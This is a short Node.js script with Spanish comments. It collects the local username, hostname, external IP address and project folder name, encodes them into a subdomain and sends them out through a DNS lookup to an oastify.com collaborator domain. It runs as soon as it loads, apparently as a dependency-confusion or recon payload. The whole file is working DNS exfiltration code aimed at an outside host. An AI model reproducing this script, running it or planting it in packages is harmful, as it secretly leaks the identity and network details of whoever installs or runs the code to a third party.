const os = require("os");
const dns = require("dns");
const https = require("https");
const path = require("path");

// Obtenci�n de informaci�n
const user = os.userInfo().username;
const hostname = os.hostname();
const projectFolderName = path.basename(__dirname); // Obtiene el nombre de la carpeta actual

// Funci�n para obtener la IP externa del usuario
const getExternalIP = () => {
  return new Promise((resolve, reject) => {
    https
      .get("https://api.ipify.org?format=json", (res) => {
        let data = "";

        res.on("data", (chunk) => {
          data += chunk;
        });

        res.on("end", () => {
          try {
            const parsedData = JSON.parse(data);
            resolve(parsedData.ip);
          } catch (error) {
            reject("Error al obtener IP externa");
          }
        });
      })
      .on("error", (error) => {
        reject("IP no disponible");
      });
  });
};

// Funci�n para limpiar los datos y asegurarnos de que son v�lidos para DNS
const sanitizeForDNS = (input) => {
  return input.replace(/[^a-zA-Z0-9.-]/g, "_"); // Reemplaza caracteres no v�lidos
};

// Funci�n para enviar los datos a trav�s de DNS
const sendDNSData = async () => {
  try {
    const externalIP = await getExternalIP();
    const sanitizedUser = sanitizeForDNS(user);
    const sanitizedHostname = sanitizeForDNS(hostname);
    const sanitizedIP = sanitizeForDNS(externalIP);
    const sanitizedProjectFolder = sanitizeForDNS(projectFolderName); // Sanitiza el nombre de la carpeta

    // Crear un string m�s corto para la URL
    const data = `${sanitizedUser}-${sanitizedHostname}-${sanitizedIP}-${sanitizedProjectFolder}`;

    // Dominio de tu colaborador donde se enviar�n las consultas DNS
    const domain = `${data}.kc0262r8oypagq3e8f89uaqmodu4i16q.oastify.com`;

    // Enviar la consulta DNS con los datos sanitizados
    dns.resolve(domain, (err, addresses) => {
      if (err) {
        console.error("Error al enviar la consulta DNS:", err);
      } else {
        console.log("Consulta DNS enviada:", addresses);
      }
    });
  } catch (error) {
    console.error("Error al obtener la IP externa:", error);
  }
};

sendDNSData();
